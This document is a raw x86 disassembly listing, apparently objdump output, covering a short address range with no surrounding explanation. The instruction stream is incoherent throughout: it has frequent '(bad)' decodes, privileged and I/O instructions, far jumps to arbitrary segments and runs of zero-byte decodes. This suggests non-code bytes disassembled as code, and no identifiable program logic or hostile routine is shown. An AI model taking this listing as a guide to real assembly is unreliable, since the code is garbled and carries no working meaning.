  4289f4:	mov    ecx,0xddfaab6e
  4289f9:	ins    BYTE PTR es:[edi],dx
  4289fa:	or     eax,0x7de0dcc3
  4289ff:	sbb    ebx,eax
  428a01:	jo     0x4289dd
  428a03:	dec    ebx
  428a04:	bound  edi,QWORD PTR [ecx-0x214305bb]
  428a0a:	dec    eax
  428a0b:	adc    eax,0x5ccad
  428a10:	cli    
  428a11:	(bad)
  428a15:	mov    dh,0x5c
  428a17:	(bad)  
  428a18:	fld    DWORD PTR [eax]
  428a1a:	add    BYTE PTR [eax],al
  428a1c:	add    BYTE PTR [eax],al
  428a1e:	ss test eax,0x856fc259
  428a24:	das    
  428a25:	sub    DWORD PTR [ecx+0x38292f84],esi
  428a2b:	scas   eax,DWORD PTR es:[edi]
  428a2c:	xchg   BYTE PTR ds:0x973c56f0,dl
  428a32:	int    0x7c
  428a34:	jge    0x428a0b
  428a36:	int    0x48
  428a38:	jne    0x428a0b
  428a3a:	mov    al,ds:0x25e96945
  428a3f:	iret   
  428a40:	pop    es
  428a41:	rol    DWORD PTR [esi-0x162904b8],1
  428a47:	push   edx
  428a48:	jg     0x4289ef
  428a4a:	push   0x7e
  428a4c:	repnz add BYTE PTR [eax+0x13fe7a63],bl
  428a53:	sub    eax,0xc45a8b65
  428a58:	dec    esp
  428a59:	les    ebx,FWORD PTR [ebp-0x4d]
  428a5c:	das    
  428a5d:	(bad)  
  428a5e:	cmp    ecx,ebp
  428a60:	or     DWORD PTR [eax+0x1c],eax
  428a63:	jl     0x428a25
  428a65:	jne    0x428a78
  428a67:	mov    BYTE PTR [eax+ebx*1-0xc],0xd
  428a6c:	std    
  428a6d:	push   ebx
  428a6f:	jge    0x428a39
  428a71:	jmp    edi
  428a73:	test   DWORD PTR [ebp+eax*2+0x458c9184],ecx
  428a7a:	in     al,0x90
  428a7c:	not    BYTE PTR ds:0x3b507c
  428a82:	add    BYTE PTR [eax],al
  428a84:	add    BYTE PTR [eax],al
  428a86:	add    BYTE PTR [ecx-0x3f],bl
  428a89:	jae    0x428a9b
  428a8b:	inc    ebx
  428a8c:	sub    al,0xb
  428a8e:	lea    ebx,[ecx]
  428a90:	mov    ecx,0x90e075f6
  428a95:	not    BYTE PTR ds:0x3b5058
  428a9b:	push   edi
  428a9c:	cmp    al,0xbf
  428a9e:	mov    esp,ecx
  428aa0:	dec    esp
  428aa1:	jp     0x428a83
  428aa3:	stos   DWORD PTR es:[edi],eax
  428aa4:	pop    edx
  428aa5:	mov    BYTE PTR [ecx],al
  428aa7:	pop    ds
  428aa8:	xor    bh,bh
  428aaa:	add    BYTE PTR [ecx],cl
  428aac:	cld    
  428aad:	cmp    BYTE PTR [edi-0x6c],0xa5
  428ab1:	stc    
  428ab2:	xor    dh,BYTE PTR [ebx-0x7f]
  428ab5:	ja     0x428acb
  428ab7:	popf   
  428ab8:	sub    eax,DWORD PTR [ebx]
  428aba:	or     eax,0x11c
  428abf:	cli    
  428ac0:	mov    DWORD PTR [eax],0x5994ca8b
  428ac6:	leave  
  428ac7:	pop    ds
  428ac8:	mov    al,BYTE PTR [edx+0x5fda75ec]
  428ace:	or     BYTE PTR [edi+0x59],dh
  428ad1:	dec    DWORD PTR [esi-0x3d]
  428ad4:	rcr    BYTE PTR [eax],1
  428ad6:	enter  0x1967,0x4
  428ada:	xchg   DWORD PTR ds:0xb586b3c2,ebp
  428ae0:	pop    ecx
  428ae1:	scas   al,BYTE PTR es:[edi]
  428ae2:	cli    
  428ae3:	and    edx,edi
  428ae5:	inc    ebx
  428ae6:	jne    0x428a73
  428ae8:	rol    dl,1
  428aea:	pop    es
  428aeb:	add    BYTE PTR [eax],al
  428aed:	add    BYTE PTR [eax],al
  428aef:	add    BYTE PTR [eax+0x4b],dh
  428af2:	add    DWORD PTR [eax],eax
  428af4:	jne    0x428aff
  428af6:	dec    ebx
  428af7:	jne    0x428b66
  428af9:	jl     0x428af4
  428afb:	iret   
  428afc:	sbb    DWORD PTR [si],eax
  428aff:	mov    al,0x74
  428b01:	xor    BYTE PTR [eax-0x3c1f5699],0xff
  428b08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b09:	fdiv   QWORD PTR [ecx]
  428b0b:	test   DWORD PTR [ebp+0x3286f72e],esi
  428b11:	popa   
  428b12:	jle    0x428ad4
  428b14:	mov    eax,eax
  428b16:	sub    DWORD PTR [esi+0x77],esp
  428b19:	xor    DWORD PTR [ebx-0x51a6ca7a],edi
  428b1f:	cli    
  428b20:	pusha  
  428b21:	test   eax,0xde753fee
  428b26:	inc    ebx
  428b27:	jne    0x428aaa
  428b29:	jno    0x428b2e
  428b2b:	add    DWORD PTR [ebp+0x59],esi
  428b2e:	jle    0x428aef
  428b30:	ja     0x428aba
  428b32:	scas   eax,DWORD PTR es:[edi]
  428b33:	mov    eax,gs
  428b35:	icebp  
  428b36:	push   eax
  428b37:	sti    
  428b38:	call   0x399:0x9dfb3bd8
  428b3f:	add    BYTE PTR [ebp-0x2a],dh
  428b42:	inc    ebx
  428b43:	jp     0x428ba2
  428b45:	loopne 0x428b88
  428b47:	push   eax
  428b48:	out    dx,al
  428b49:	add    ch,BYTE PTR [edx]
  428b4b:	cld    
  428b4c:	jns    0x428b6a
  428b4e:	in     eax,0x3
  428b50:	jne    0x428b04
  428b52:	rcr    eax,1
  428b54:	add    BYTE PTR [eax],al
  428b56:	add    BYTE PTR [eax],al
  428b58:	add    BYTE PTR [edx+0x5a],bh
  428b5b:	mul    ebx
  428b5d:	pop    edi
  428b5e:	inc    ebx
  428b5f:	ins    BYTE PTR es:[edi],dx
  428b60:	inc    ebx
  428b61:	enter  0xf7a0,0x43
  428b65:	scas   eax,DWORD PTR es:[edi]
  428b66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b67:	lahf   
  428b68:	inc    ecx
  428b69:	jns    0x428b6d
  428b6b:	push   ss
  428b6c:	adc    esp,DWORD PTR [edx]
  428b6e:	or     DWORD PTR [ebx+0x8],eax
  428b71:	jle    0x428bf0
  428b73:	inc    esp
  428b74:	add    esi,DWORD PTR [ebp+0x2]
  428b77:	add    DWORD PTR [ebx+edi*8-0x7fb1173f],ebp
  428b7e:	xchg   esi,eax
  428b7f:	xlat   BYTE PTR ds:[ebx]
  428b80:	ret    
  428b81:	adc    bh,BYTE PTR [edx-0x1d]
  428b84:	or     cl,dl
  428b86:	repnz ins BYTE PTR es:[edi],dx
  428b88:	jae    0x428bff
  428b8a:	add    ch,cl
  428b8c:	(bad)  [edx+0x5b03e8f9]
  428b92:	cli    
  428b93:	pop    ecx
  428b94:	sbb    ch,cl
  428b96:	sub    esp,DWORD PTR [esi+0x4ecde03]
  428b9c:	cmc    
  428b9d:	call   0x2607:0x7ac57002
  428ba4:	xlat   BYTE PTR ds:[ebx]
  428ba5:	pop    esi
  428ba6:	stos   DWORD PTR es:[edi],eax
  428ba7:	pop    ebp
  428ba8:	adc    BYTE PTR ds:0x4d03a8f0,cl
  428bae:	shr    BYTE PTR [ebp-0x3d],cl
  428bb1:	mov    dl,0x43
  428bb3:	ror    DWORD PTR [esi-0x3a],cl
  428bb6:	jbe    0x428b5b
  428bb8:	sti    
  428bb9:	sbb    al,dh
  428bbb:	pop    ebp
  428bbc:	ret    
  428bbd:	add    BYTE PTR [eax],al
  428bbf:	add    BYTE PTR [eax],al
  428bc1:	add    BYTE PTR [edx-0x71f85787],bl
  428bc7:	or     edi,edx
  428bc9:	xor    eax,0xe0ffb3f2
  428bce:	sahf   
  428bcf:	jp     0x428b58
  428bd1:	test   eax,0xf1417976
  428bd6:	shl    esp,0xfa
  428bd9:	mov    dh,0xec
  428bdb:	int3   
  428bdc:	pop    es
  428bdd:	inc    ecx
  428bde:	ror    DWORD PTR [ecx-0x3c2016c0],1
  428be4:	or     eax,esi
  428be6:	imul   edi,DWORD PTR ds:0xa0b72d3,0xffffff89
  428bed:	sub    BYTE PTR [ecx-0x77],cl
  428bf0:	inc    edx
  428bf1:	loope  0x428bfc
  428bf3:	sti    
  428bf4:	push   edi
  428bf5:	in     eax,dx
  428bf6:	dec    edx
  428bf7:	adc    eax,0xb6294139
  428bfc:	or     eax,0x740dced0
  428c01:	fsubr  QWORD PTR [edi-0x26]
  428c04:	paddw  mm1,QWORD PTR [esi]
  428c07:	icebp  
  428c08:	mov    edi,0x3c48e29
  428c0d:	adc    dh,BYTE PTR [edx+edx*8+0x420a4ee7]
  428c14:	sti    
  428c15:	jo     0x428c3a
  428c17:	or     bh,bl
  428c19:	pop    ss
  428c1a:	cmp    BYTE PTR [edi],dl
  428c1c:	mov    eax,0x8841b6fb
  428c21:	out    dx,eax
  428c22:	test   BYTE PTR [edx+0x57],al
  428c25:	sub    al,BYTE PTR [eax]
  428c27:	add    BYTE PTR [eax],al
  428c29:	add    BYTE PTR [eax],al
  428c2b:	dec    esp
  428c2c:	les    eax,FWORD PTR [edi]
  428c2e:	xchg   esi,eax
  428c2f:	jae    0x428c15
  428c31:	add    ebp,ecx
  428c33:	jbe    0x428c07
  428c35:	mov    edx,0x277e5
  428c3a:	mov    esi,0xfa241741
  428c3f:	mov    dh,0x41
  428c41:	test   BYTE PTR [ecx],ch
  428c43:	retf   0x2e04
  428c46:	sub    DWORD PTR [esi],edi
  428c48:	cmp    al,BYTE PTR [eax]
  428c4a:	add    BYTE PTR [ebp+eax*1-0x457bb17d],bl
  428c51:	push   ebx
  428c52:	and    al,0x94
  428c54:	jbe    0x428bd6
  428c56:	shr    DWORD PTR [edx+0x44000003],0xc6
  428c5d:	in     al,0xff
  428c5f:	dec    ebx
  428c60:	mov    al,al
  428c62:	jne    0x428c92
  428c64:	mov    edx,0xce040845
  428c69:	idiv   bh
  428c6b:	mov    ebx,0x523080bd
  428c70:	add    eax,0x3e9a8b00
  428c75:	mov    BYTE PTR [ecx+0x740],al
  428c7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428c7c:	inc    edi
  428c7d:	add    edx,DWORD PTR [ebx+0x4f]
  428c80:	jmp    0x0:0x7449888
  428c87:	xchg   edi,eax
  428c88:	inc    edi
  428c89:	add    ecx,DWORD PTR [ecx-0x1ee6c]
  428c8f:	add    BYTE PTR [eax],al
  428c91:	add    BYTE PTR [eax],al
  428c93:	add    BYTE PTR [edx+edi*4],bl
  428c96:	cmp    eax,0x3fad9508
  428c9b:	push   es
  428c9c:	or     al,0x5
  428c9e:	add    DWORD PTR [esi-0x1c],0xffffffc5
  428ca2:	jg     0x428ce8
  428ca4:	rol    BYTE PTR [eax+eax*1],cl
  428ca7:	add    esp,ecx
  428ca9:	add    al,0x0
  428cab:	mov    edx,DWORD PTR [edx]
  428cad:	cmp    eax,0x7049888
  428cb2:	add    BYTE PTR [eax],al
  428cb4:	inc    edi
  428cb5:	inc    edi
  428cb6:	add    esi,DWORD PTR [ebx]
  428cb8:	xchg   ebp,eax
  428cb9:	daa    
  428cba:	mov    BYTE PTR [eax+0x6dc],cl
  428cc0:	daa    
  428cc1:	inc    edi
  428cc2:	add    ecx,DWORD PTR [eax+0x172f4]
  428cc8:	jne    0x428cf5
  428cca:	js     0x428d0e
  428ccc:	ins    DWORD PTR es:[edi],dx
  428ccd:	xor    DWORD PTR [ecx+0x22b3586],0x4e
  428cd4:	jb     0x428d01
  428cd6:	dec    DWORD PTR [edi-0x7e]
  428cd9:	pop    ebp
  428cda:	not    DWORD PTR [eax]
  428cdc:	xor    eax,0x7d42782b
  428ce1:	rol    DWORD PTR [edx],cl
  428ce3:	push   0xffc3b4c5
  428ce8:	jns    0x428ce5
  428cea:	sti    
  428ceb:	call   FWORD PTR [edx-0x6]
  428cee:	inc    esi
  428cef:	adc    eax,0xffbf5bf9
  428cf4:	jmp    edi
  428cf6:	sti    
  428cf7:	push   ecx
  428cf8:	add    BYTE PTR [eax],al
  428cfa:	add    BYTE PTR [eax],al
  428cfc:	add    al,dh
  428cfe:	mov    eax,ds:0x29750213
  428d03:	mov    ah,0x67
  428d05:	fisttp WORD PTR [ecx]
  428d07:	ret    0x92ff
  428d0a:	sbb    esp,esp
  428d0c:	cmp    eax,0x5fac0175
  428d11:	mov    bh,0x29
  428d13:	xlat   BYTE PTR ds:[ebx]
  428d14:	inc    edi
  428d15:	xchg   ebp,eax
  428d16:	jmp    0x428d1b
  428d18:	push   0xffc20945
  428d1d:	call   0x3501:0x753ddf51
  428d24:	pop    ebx
  428d25:	aaa    
  428d26:	sub    edi,edx
  428d28:	xor    al,0x48
  428d2a:	imul   edi,edi,0x67
  428d2d:	mov    ?,WORD PTR [esi-0x3b]
  428d30:	(bad)  
  428d31:	jmp    0xf6aa80d5
  428d36:	dec    edx
  428d37:	(bad)  
  428d3a:	add    BYTE PTR [ebx+eax*1-0x77089812],dh
  428d41:	je     0x428ce7
  428d43:	mov    ebp,0x2d02f607
  428d48:	adc    BYTE PTR [edx+0x49],bl
  428d4b:	loopne 0x428d38
  428d4d:	dec    ebx
  428d4e:	(bad)  
  428d50:	inc    esp
  428d51:	ds inc esp
  428d53:	in     eax,0x3
  428d55:	cli    
  428d56:	enter  0xbbec,0x6
  428d5a:	add    esi,DWORD PTR [ecx-0x54749930]
  428d60:	sti    
  428d61:	add    BYTE PTR [eax],al
  428d63:	add    BYTE PTR [eax],al
  428d65:	add    bl,bh
  428d67:	stc    
  428d68:	call   0x19820c3c
  428d6d:	dec    ebx
  428d6e:	lds    edx,FWORD PTR [edx]
  428d70:	outs   dx,BYTE PTR ds:[esi]
  428d71:	sar    DWORD PTR [edx-0x7d],0x9
  428d75:	add    al,0xbc
  428d77:	inc    ebx
  428d78:	xor    al,0x7f
  428d7a:	popa   
  428d7b:	adc    ebp,0xfffffff7
  428d7e:	mov    ebx,0x6ed0b9d7
  428d83:	aas    
  428d84:	fsub   QWORD PTR [ebx+0x6b]
  428d87:	ret    0x7ee8
  428d8a:	sub    eax,0xb678bdf3
  428d8f:	aas    
  428d90:	jo     0x428d3a
  428d92:	mov    DWORD PTR es:[eax+ecx*2],esi
  428d96:	pop    eax
  428d97:	inc    eax
  428d98:	jmp    0x6a5202a0
  428d9d:	jbe    0x428e14
  428d9f:	add    ch,cl
  428da1:	jle    0x428d52
  428da3:	or     bl,BYTE PTR [esi-0x50]
  428da6:	jb     0x428d52
  428da8:	in     al,0x4
  428daa:	jne    0x428dae
  428dac:	inc    sp
  428dae:	xchg   DWORD PTR [edx],ebp
  428db0:	gs pop edi
  428db2:	fidivr WORD PTR [esi]
  428db4:	ins    BYTE PTR es:[edi],dx
  428db5:	inc    ebx
  428db6:	pusha  
  428db7:	mov    esi,0xe484ab1
  428dbc:	je     0x428d7e
  428dbe:	(bad)  
  428dbf:	rcl    DWORD PTR [eax-0x42],1
  428dc2:	sbb    al,0x2
  428dc4:	add    cl,ch
  428dc6:	cmp    al,BYTE PTR [edx+0x74]
  428dc9:	ret    0x0
  428dcc:	add    BYTE PTR [eax],al
  428dce:	add    cl,bh
  428dd0:	mov    esp,0x271e9fb
  428dd5:	add    BYTE PTR [ebp+0x1652cfa5],bl
  428ddb:	lds    ecx,FWORD PTR [edx]
  428ddd:	dec    edi
  428dde:	add    DWORD PTR [eax+0xb06fb41],esi
  428de4:	cmp    al,BYTE PTR [edi+0x58867ea7]
  428dea:	fstp   QWORD PTR [ebx]
  428dec:	or     BYTE PTR [edi+0x7d856ea7],al
  428df2:	fnsave [edi+0x71e813c2]
  428df8:	xor    eax,0xc0d80174
  428dfd:	pop    es
  428dfe:	inc    ebx
  428dff:	jbe    0x428dab
  428e01:	or     DWORD PTR [eax+0x33],0x566a633e
  428e08:	add    BYTE PTR [eax],al
  428e0a:	inc    ecx
  428e0b:	sub    al,0xa3
  428e0d:	cmp    eax,0x67d0e9e9
  428e12:	cmp    eax,0x9dffc2a8
  428e17:	mov    DWORD PTR [ecx],edi
  428e19:	push   eax
  428e1a:	loope  0x428e0d
  428e1c:	inc    esi
  428e1d:	and    BYTE PTR [ecx+edi*4+0x9],ah
  428e21:	xchg   ebp,eax
  428e22:	stos   BYTE PTR es:[edi],al
  428e23:	js     0x428de4
  428e25:	repz cmc 
  428e27:	je     0x428dfa
  428e29:	out    0x4a,eax
  428e2b:	or     BYTE PTR [esi],bh
  428e2d:	sti    
  428e2e:	outs   dx,BYTE PTR ds:[esi]
  428e2f:	ret    0xe831
  428e32:	add    BYTE PTR [eax],0x0
  428e35:	add    BYTE PTR [eax],al
  428e37:	add    al,bl
  428e39:	cmp    eax,0x253873fb
  428e3e:	push   es
  428e3f:	push   esi
  428e40:	stos   BYTE PTR es:[edi],al
  428e41:	xor    eax,ebp
  428e43:	pop    esi
  428e44:	loopne 0x428e83
  428e46:	sti    
  428e47:	add    dh,cl
  428e49:	rcl    DWORD PTR [esi+0x5b],0x85
  428e4d:	les    eax,FWORD PTR [edi]
  428e4f:	add    cl,bl
  428e51:	mov    esi,0x35d98beb
  428e56:	sub    ah,0xa4
  428e59:	pop    es
  428e5a:	add    BYTE PTR [eax],al
  428e5c:	jmp    0x428de4
  428e5e:	shr    BYTE PTR [esp+ebx*8],0xca
  428e62:	je     0x428e6c
  428e64:	xor    DWORD PTR [ebp-0x348c0209],edi
  428e6a:	dec    edi
  428e6b:	mov    esi,DWORD PTR [ebp-0x22]
  428e6e:	daa    
  428e6f:	pop    ebp
  428e70:	or     edx,0xffffff84
  428e73:	shr    al,0xe6
  428e76:	add    BYTE PTR [edi+0x60],0x73
  428e7a:	xor    BYTE PTR [edi+0x58],0xb4
  428e7e:	add    DWORD PTR [ebp+0x44],0xffffffc4
  428e82:	idiv   bh
  428e84:	mov    WORD PTR [ebp-0x35ce077c],?
  428e8a:	not    BYTE PTR [eax+0x24]
  428e8d:	(bad)  
  428e8e:	cmc    
  428e8f:	inc    DWORD PTR [ebx]
  428e91:	imul   edi,DWORD PTR [edi-0x40],0x68
  428e95:	pop    es
  428e96:	test   DWORD PTR [edi+0x24],0x5fc016
  428e9d:	add    BYTE PTR [eax],al
  428e9f:	add    BYTE PTR [eax],al
  428ea1:	in     eax,0xc6
  428ea3:	pop    es
  428ea4:	add    BYTE PTR [edi],bh
  428ea6:	sar    DWORD PTR [edi],0xc2
  428ea9:	xor    BYTE PTR [ecx],al
  428eab:	push   ebp
  428eac:	mov    esp,eax
  428eae:	test   esp,ebp
  428eb0:	xor    al,0x5f
  428eb2:	jo     0x428ede
  428eb4:	(bad)  [esi+0x3a]
  428eb7:	mov    WORD PTR [ebp+0x0],es
  428eba:	jbe    0x428f07
  428ebc:	mov    DWORD PTR [ecx-0x57a27710],esi
  428ec2:	mov    eax,0xd475d85c
  428ec7:	jmp    0xffadfa1b
  428ecc:	jle    0x428e7f
  428ece:	ss jb  0x428f46
  428ed1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428ed2:	mov    cl,0xa1
  428ed4:	out    0xcd,eax
  428ed6:	jmp    0xb3e:0xa6b2fb42
  428edd:	icebp  
  428ede:	int    0xfe
  428ee0:	push   DWORD PTR [ebp+0x1c]
  428ee3:	retf   0x8d07
  428ee6:	lea    eax,[edx-0x5]
  428ee9:	xchg   edx,eax
  428eea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428eeb:	ds or  esi,ecx
  428eee:	(bad)  
  428ef0:	push   DWORD PTR [ebp-0x50]
  428ef3:	iret   
  428ef4:	add    ebp,eax
  428ef6:	ins    DWORD PTR es:[edi],dx
  428ef7:	das    
  428ef8:	push   edx
  428ef9:	cmp    ah,BYTE PTR [edi+0x53]
  428efc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428efd:	(bad)  
  428efe:	jmp    0x59fb1806
  428f03:	jge    0x428f62
  428f05:	add    BYTE PTR [eax],al
  428f07:	add    BYTE PTR [eax],al
  428f09:	add    BYTE PTR [ecx+0x55],ah
  428f0c:	icebp  
  428f0d:	fbld   TBYTE PTR [edi-0x17]
  428f10:	add    ecx,DWORD PTR [ecx-0x40f8be50]
  428f16:	retf   
  428f17:	sub    eax,0xebb97edd
  428f1c:	inc    ecx
  428f1d:	pop    esp
  428f1e:	test   eax,0xb088bf25
  428f23:	popa   
  428f24:	inc    ebx
  428f25:	jae    0x428fa0
  428f27:	scas   al,BYTE PTR es:[edi]
  428f28:	shr    bl,0xee
  428f2b:	fs jge 0x428f31
  428f2e:	sbb    eax,0xafb6274
  428f33:	inc    ebx
  428f34:	test   al,0xf3
  428f36:	mov    ebx,DWORD PTR [ebx+0x76]
  428f39:	inc    ebp
  428f3a:	sbb    eax,0x37617f02
  428f3f:	sub    edi,edx
  428f41:	jp     0x428f97
  428f43:	add    ah,BYTE PTR [edi+0x193b3203]
  428f49:	inc    edi
  428f4a:	inc    ebp
  428f4b:	push   cs
  428f4c:	inc    ax
  428f4e:	gs inc esp
  428f50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428f51:	cli    
  428f52:	jne    0x428ed9
  428f54:	sub    ecx,edx
  428f56:	ret    
  428f57:	sbb    DWORD PTR [edx+edi*8+0x3f18b5e9],0x38
  428f5f:	cs jmp 0x1144fa31
  428f65:	std    
  428f66:	pushf  
  428f67:	cmp    ebx,DWORD PTR [edx]
  428f69:	jnp    0x428f9b
  428f6b:	push   esi
  428f6c:	mov    eax,ds:0xcf
  428f71:	add    BYTE PTR [eax],al
  428f73:	xchg   ebx,eax
  428f74:	ret    
  428f75:	xchg   ebx,eax
  428f76:	sti    
  428f77:	(bad)  
  428f78:	mov    ch,0x20
  428f7a:	pop    esp
  428f7b:	or     al,0x18
  428f7d:	jmp    0x191fcb85
  428f82:	sar    BYTE PTR [ebp+0x3b],1
  428f85:	je     0x428fba
  428f87:	outs   dx,BYTE PTR ds:[esi]
  428f88:	adc    eax,0x2a2f1a1
  428f8d:	outs   dx,DWORD PTR ds:[esi]
  428f8e:	shl    BYTE PTR [ebx+0x27],0x0
  428f92:	jns    0x428f5c
  428f94:	push   edx
  428f95:	shr    DWORD PTR [eax],0x48
  428f98:	cmp    eax,edx
  428f9a:	jp     0x428f54
  428f9c:	push   esi
  428f9d:	xor    eax,edx
  428f9f:	cmp    eax,ebx
  428fa1:	cmp    edi,esp
  428fa3:	das    
  428fa4:	mov    ch,0x90
  428fa6:	pop    ebx
  428fa7:	push   0x5c03e918
  428fac:	fnstsw WORD PTR [eax+0x1c3b6dcf]
  428fb2:	xor    al,0xe
  428fb4:	adc    eax,0x24af151
  428fb9:	mov    bh,0x43
  428fbb:	lahf   
  428fbc:	xlat   BYTE PTR ds:[ebx]
  428fbd:	scas   eax,DWORD PTR es:[edi]
  428fbe:	inc    ecx
  428fbf:	jno    0x428fc3
  428fc1:	add    BYTE PTR [esi+ebp*2],bl
  428fc4:	cs jg  0x429038
  428fc7:	xor    esi,DWORD PTR [ebp+0x6c56608]
  428fcd:	sti    
  428fce:	hlt    
  428fcf:	call   0xfb5:0x3be9400c
  428fd6:	mov    bh,0x0
  428fd8:	add    BYTE PTR [eax],al
  428fda:	add    BYTE PTR [eax],al
  428fdc:	push   es
  428fdd:	cmp    BYTE PTR [ebp-0xb],dh
  428fe0:	pushf  
  428fe1:	cmp    bh,dl
  428fe3:	mov    ah,0xbe
  428fe5:	aaa    
  428fe6:	adc    eax,0xfffaa95d
  428feb:	imul   edi,DWORD PTR [ebp-0x6258fff6],0xb2f944f3
  428ff5:	cmp    al,0x2e
  428ff7:	sub    DWORD PTR [edi+0x49],esp
  428ffa:	bound  esp,QWORD PTR [eax-0x7e]
  428ffd:	rcr    BYTE PTR [ebx+ebp*1-0x76],0x3a
  429002:	push   esp
  429003:	jb     0x429027
  429005:	retf   
  429006:	xchg   BYTE PTR [ecx],dl
  429008:	and    ch,dl
  42900a:	jle    0x428ffe
  42900c:	mov    al,0xaf
  42900e:	push   es
  42900f:	out    0x32,al
  429011:	push   cs
  429012:	sti    
  429013:	hlt    
  429014:	call   0x665a:0xcde94008
  42901b:	jmp    0xfa4e3fd1
  429020:	mov    al,0x3d
  429022:	jne    0x429015
  429024:	mov    ebp,0xb855e879
  429029:	cmp    eax,0x7fb962fb
  42902e:	sti    
  42902f:	daa    
  429030:	add    ch,0x8c
  429033:	in     eax,0x71
  429035:	jg     0x428ff7
  429037:	sbb    eax,0xf07d221a
  42903c:	jbe    0x429040
  42903e:	xchg   DWORD PTR [eax],eax
  429040:	add    BYTE PTR [eax],al
  429042:	add    BYTE PTR [eax],al
  429044:	add    BYTE PTR [ecx+edi*4-0x13],bh
  429048:	je     0x429068
  42904a:	div    BYTE PTR [di-0x28]
  42904e:	mov    edx,0x3de1ffba
  429053:	jecxz  0x4290ca
  429055:	pop    ebx
  429056:	mov    edi,0xdb928bf6
  42905b:	stc    
  42905c:	xor    bl,BYTE PTR [edi+ebx*2-0x3be6a4a7]
  429063:	pop    es
  429064:	add    cl,ah
  429066:	mov    edx,0x67df51eb
  42906b:	dec    esi
  42906c:	push   ecx
  42906e:	cmp    eax,0xd517f882
  429073:	not    BYTE PTR ds:0x3b346c
  429079:	daa    
  42907a:	out    0x8c,al
  42907c:	add    al,0xa7
  42907e:	mov    al,0x43
  429080:	add    BYTE PTR [esi+0xdfc44bc],bl
  429086:	jns    0x42907f
  429088:	add    BYTE PTR [eax-0x607efffb],dl
  42908e:	(bad)  
  42908f:	stc    
  429090:	call   FWORD PTR [esp+eax*4-0xd]
  429094:	add    BYTE PTR [ebp+eiz*2+0x0],cl
  429098:	ja     0x42902e
  42909a:	mov    ebx,0xb534fc4c
  42909f:	pop    ss
  4290a0:	add    BYTE PTR [ecx+edi*4-0x41],bl
  4290a4:	je     0x42910e
  4290a6:	mov    edi,0xc74
  4290ab:	add    BYTE PTR [eax],al
  4290ad:	add    bh,al
  4290af:	aaa    
  4290b0:	div    BYTE PTR [ebp+0x14]
  4290b3:	mov    al,0x3
  4290b5:	js     0x429046
  4290b7:	outs   dx,BYTE PTR ds:[esi]
  4290b8:	not    BYTE PTR ds:0x3b32a8
  4290be:	xchg   ecx,eax
  4290bf:	lds    esi,FWORD PTR [edi-0x38]
  4290c2:	jne    0x429062
  4290c4:	mov    bh,0xfa
  4290c6:	dec    esi
  4290c7:	push   0xffffffc2
  4290c9:	shl    BYTE PTR [esi-0x7d],0x78
  4290cd:	add    al,BYTE PTR [esi+0x72]
  4290d0:	fisttp QWORD PTR [eax-0x3c87cc7f]
  4290d6:	fisubr WORD PTR [ebx]
  4290d8:	or     al,0xe2
  4290db:	aas    
  4290dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4290dd:	push   esi
  4290de:	lods   al,BYTE PTR ds:[esi]
  4290df:	in     al,dx
  4290e0:	idiv   bh
  4290e2:	sub    BYTE PTR [eax+0x44],bh
  4290e5:	je     0x429078
  4290e7:	push   edi
  4290e8:	js     0x4290da
  4290ea:	ret    0x3b55
  4290ed:	push   cs
  4290ee:	xor    eax,0xf4f8782b
  4290f3:	out    0xfe,eax
  4290f5:	std    
  4290f6:	stos   BYTE PTR es:[edi],al
  4290f7:	sub    bh,BYTE PTR [esi-0x5]
  4290fa:	jne    0x429127
  4290fc:	lahf   
  4290fd:	add    BYTE PTR [edx],ah
  4290ff:	pop    ebx
  429100:	jb     0x42914d
  429102:	je     0x429107
  429104:	nop/reserved BYTE PTR [ebp+0x2b]
  429108:	jnp    0x4290ca
  42910a:	or     DWORD PTR [edi+0x44],eax
  42910d:	je     0x429160
  42910f:	pop    ebx
  429110:	inc    esp
  429111:	je     0x429113
  429113:	add    BYTE PTR [eax],al
  429115:	add    BYTE PTR [eax],al
  429117:	cdq    
  429118:	pop    ecx
  429119:	lods   al,BYTE PTR ds:[esi]
  42911a:	cli    
  42911b:	mov    ds:0x8687ed28,eax
  429120:	jmp    0xa2781628
  429125:	push   esp
  429126:	(bad)  
  429127:	ret    0xfb50
  42912a:	ror    al,0x63
  42912d:	mov    ecx,DWORD PTR [edx]
  42912f:	cmp    esp,DWORD PTR [esi]
  429131:	pop    es
  429132:	add    BYTE PTR [esi+0x2d],cl
  429135:	or     al,0x32
  429138:	adc    esi,ebx
  42913a:	mov    ebp,0x85d9297d
  42913f:	inc    ebp
  429140:	add    ebp,DWORD PTR [ecx+0x5307712e]
  429146:	push   esi
  429147:	fwait
  429148:	or     DWORD PTR [ebx],esi
  42914a:	call   0x361031ce
  42914f:	push   0x30
  429151:	data16 sub dh,BYTE PTR [esi-0x7d]
  429155:	mov    ds:0x770354f4,eax
  42915a:	adc    esp,DWORD PTR [edi]
  42915c:	inc    ebx
  42915d:	dec    DWORD PTR [ebx+ecx*2]
  429160:	mov    al,ds:0x5482541d
  429165:	data16 es jbe 0x4290ec
  429169:	daa    
  42916a:	hlt    
  42916b:	push   esp
  42916c:	add    edi,DWORD PTR [ecx]
  42916e:	stos   BYTE PTR es:[edi],al
  42916f:	in     eax,dx
  429170:	icebp  
  429171:	retf   0x248c
  429174:	add    al,0x9b
  429176:	inc    esi
  429177:	xor    bh,BYTE PTR [edx]
  429179:	xor    bh,BYTE PTR [ecx+0x0]
  42917f:	add    BYTE PTR [eax+0x37],dh
  429182:	mov    ch,0xe7
  429184:	jbe    0x4291bd
  429186:	cld    
  429187:	and    ebp,DWORD PTR [ebx-0x3e]
  42918a:	call   0x12154695
  42918f:	mov    eax,0x2bb30a56
  429194:	int3   
  429195:	sbb    ch,cl
  429197:	add    ecx,DWORD PTR [edx+0x49]
  42919a:	or     DWORD PTR [ecx+eax*4+0x750826f2],0xffffff83
  4291a2:	icebp  
  4291a3:	inc    edx
  4291a4:	call   0x96fa73b5
  4291a9:	(bad)  
  4291aa:	fstp   DWORD PTR [eax]
  4291ac:	cmp    DWORD PTR [ecx+ebp*1],edx
  4291af:	add    al,0xa5
  4291b1:	aaa    
  4291b2:	push   ebp
  4291b3:	call   0x8a136232
  4291b8:	pop    ebp
